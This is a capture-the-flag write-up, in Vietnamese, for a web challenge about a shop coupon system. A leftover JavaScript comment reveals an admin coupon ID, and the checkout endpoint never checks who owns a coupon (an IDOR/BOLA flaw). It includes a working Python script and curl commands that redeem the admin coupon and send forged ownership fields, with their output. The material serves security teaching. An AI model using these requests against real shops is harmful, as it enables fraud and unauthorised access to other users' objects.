---
title: "The Discount That Wasn't There"
category: "Web"
tags: ["idor", "broken-access-control", "information-disclosure"]
solve_date: "2026-10-10T20:00:00+07:00"
language: "vi"
points: 200
---

# The Discount That Wasn't There

**Flag:** `foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}`
**Dịch vụ:** `http://54.87.116.237:5003` (Flask + gunicorn, đăng ký tài khoản tự do)

| Artifact lấy từ service | Bytes | SHA-256 |
|---|---:|---|
| `/static/app.js` | 782 | `3a4aed11534c640aa4267397c128d8e5a1707f50b82678154dd2ef40d16bcd4c` |

## Đề bài

> A fictional e-commerce platform has launched a limited-time sale, offering exclusive discount coupons to registered users. After logging in, you receive your own coupon and are assured that it can only be used by your account.
>
> But what if the server's definition of ownership isn't as secure as it seems?
>
> Somewhere in the application lies an administrator's exclusive coupon, offering a discount far beyond what ordinary users can access. [...]
>
> Hint: Don't trust what the browser tells you about who owns something.

Mục tiêu là tìm coupon của admin và redeem qua checkout để lấy flag.

## Phân tích

Ứng dụng là một storefront tối giản. Đăng ký `POST /register` (username/password) trả `302 → /dashboard` và set cookie:

```text
session=eyJ1c2VyX2lkIjoyNn0.aso2iA.mvgkmQHvGerEeg3Kmu3ImXNEu9s
```

Giải mã phần payload cho `{"user_id":26}` — session chỉ chứa danh tính, không có voucher. Bề mặt API gồm hai endpoint JSON, ngoài các route HTML (`/`, `/register`, `/login`, `/dashboard`, `/logout`); các path như `/admin`, `/coupons`, `/api/coupons`, `/products`, `/flag.txt` đều trả 404.

`GET /api/coupon` (yêu cầu đăng nhập) trả đúng một coupon của người gọi:

```json
{"coupon":"USER10","coupon_id":"9fb688bc-b1e1-4425-b09f-d772ea11e9dc","discount":10,"owner_id":26,"username":"danh01"}
```

Hai chi tiết đáng chú ý: server lưu quan hệ sở hữu (`owner_id`) và định danh coupon là UUID RFC-4122 version 4 (nibble phiên bản `4` ở group ba). Nhóm ID kế tiếp của một tài khoản khác — `f1b66b3d-81a2-4a56-9a3f-8ad55de2ff75` — xác nhận coupon_id sinh ngẫu nhiên theo tài khoản, nên việc đoán ID theo dãy là không khả thi. Bài toán do đó quy về hai vế: tìm ID của coupon admin, và khai thác cách `/api/checkout` xử lý ID đó.

Vế thứ nhất nằm ở bundle client. `/static/app.js` (comment đầu file: `PixelMart storefront bundle (v2.3.1)`) gọi hai endpoint trên, rồi còn sót một ghi chú thử nghiệm:

```js
// TODO(dev): remove this before prod — leftover from testing the admin
// override flow against the staging coupon table.
// test case: checkout("8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2")
```

Vế thứ hai là lỗi thật sự. `POST /api/checkout` chỉ nhận `coupon_id`, và kiểm tra quyền dừng lại ở lớp xác thực — yêu cầu không kèm cookie session nhận về:

```text
401 {"error":"authentication required"}
```

Nhưng không có bước nào so khớp coupon với `user_id` của người gọi. Bằng chứng trực tiếp: thêm field quyền sở hữu vào body không làm thay đổi kết quả, trong các probe đã thực hiện —

```text
{"coupon_id":"8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2","user_id":1,"username":"admin"}
200 {"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
```

Ràng buộc "coupon chỉ dùng được cho tài khoản của bạn" tồn tại ở nơi khác: UI chỉ hiển thị coupon mà `/api/coupon` trả về, còn ô nhập `coupon_id` ở checkout và hàm `checkout()` trong `app.js` cho phép gửi bất kỳ ID nào. Đây là BOLA/IDOR trên `/api/checkout` — đối tượng được tham chiếu bằng ID do người dùng kiểm soát, máy chủ không kiểm tra quyền sở hữu.

## Lời giải

1. `POST /register` với username/password bất kỳ, giữ cookie `session` từ response.
2. Đọc `/static/app.js`, lấy UUID trong comment `test case:` — `8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2`.
3. `POST /api/checkout` với `Content-Type: application/json` và body `{"coupon_id":"8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2"}`.

Phản hồi nhận được (mã 200):

```text
{"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
```

Cùng tài khoản, redeem coupon của chính mình chỉ cho receipt thông thường, nên flag không phải giá trị luôn hiện ra ở checkout:

```text
{"coupon_used":"USER10","discount_applied":"10%","receipt":"RCPT-9FB688BC","success":true}
```

Giá trị `8f3c4a9e-...` là bản ghi tĩnh: nó trả về cùng một response cho hai tài khoản khác nhau (`user_id` 26 và 113) và trên năm lần gọi liên tiếp. Server không công bố `owner_id` của coupon này; danh tính "coupon của admin" dựa trên mã `ADMIN50`, mức giảm 50% so với `USER10`/10% của người dùng thường, và đúng vai trò mà đề bài mô tả.

## Kết quả

Flag đọc từ trường `receipt` trong phản hồi `/api/checkout` của dịch vụ:

```text
foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}
```

Không có endpoint `/submit` trong ứng dụng; tài liệu này không lưu phản hồi submission.

## Tái hiện

Cần Python 3 kèm `requests` (`pip install requests`). Script dưới đây chạy trọn chuỗi: đăng ký → đọc coupon của mình → redeem coupon admin → các probe biên.

```python
import json
import requests

BASE = "http://54.87.116.237:5003"
ADMIN_COUPON = "8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2"

s = requests.Session()
r = s.post(f"{BASE}/register", data={"username": "wuprobe", "password": "wuprobe"},
           allow_redirects=False)
print("[*] register ->", r.status_code, r.headers.get("Location"))
print("[*] session cookie =", s.cookies.get("session"))

r = s.get(f"{BASE}/api/coupon")
print("[*] /api/coupon ->", json.dumps(r.json(), sort_keys=True))

mine = r.json()["coupon_id"]

r = s.post(f"{BASE}/api/checkout", json={"coupon_id": ADMIN_COUPON})
print("[*] admin coupon ->", r.status_code, r.text.strip())

r = s.post(f"{BASE}/api/checkout", json={"coupon_id": mine})
print("[*] own coupon  ->", r.status_code, r.text.strip())

r = s.post(f"{BASE}/api/checkout", json={"coupon_id": "1"})
print("[*] id = 1      ->", r.status_code, r.text.strip())

r = s.post(f"{BASE}/api/checkout",
           json={"coupon_id": ADMIN_COUPON, "user_id": 1, "username": "admin"})
print("[*] forged body ->", r.status_code, r.text.strip())

r = requests.post(f"{BASE}/api/checkout", json={"coupon_id": ADMIN_COUPON})
print("[*] no session  ->", r.status_code, r.text.strip())
```

Output ghi nhận từ lần chạy:

```text
[*] register -> 302 /dashboard
[*] session cookie = eyJ1c2VyX2lkIjoxMTN9.asyyvQ.LUf9wQKiS4AqM0A0wJRRdJzmJTI
[*] /api/coupon -> {"coupon": "USER10", "coupon_id": "f1b66b3d-81a2-4a56-9a3f-8ad55de2ff75", "discount": 10, "owner_id": 113, "username": "wuprobe"}
[*] admin coupon -> 200 {"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
[*] own coupon  -> 200 {"coupon_used":"USER10","discount_applied":"10%","receipt":"RCPT-F1B66B3D","success":true}
[*] id = 1      -> 404 {"error":"invalid coupon"}
[*] forged body -> 200 {"coupon_used":"ADMIN50","discount_applied":"50%","receipt":"foobarnitd{b0l4_un1v3rs4l_c0up0n_pwn}","success":true}
[*] no session  -> 401 {"error":"authentication required"}
```

Bản curl tối thiểu, dùng trên Git Bash hoặc PowerShell (`curl.exe`):

```bash
curl -s -c jar.txt -X POST http://54.87.116.237:5003/register \
     -d "username=danh01&password=Test1234" -o /dev/null

curl -s -b jar.txt -H "Content-Type: application/json" \
     -X POST http://54.87.116.237:5003/api/checkout \
     -d '{"coupon_id":"8f3c4a9e-2b71-4d5a-9c3e-04ae91a7f3c2"}'
```

`coupon_id` của tài khoản vừa đăng ký là giá trị khác nhau ở mỗi lần chạy; chỉ UUID admin là cố định. Nếu instance không còn giữ bản ghi đó, đọc lại comment trong `/static/app.js`.
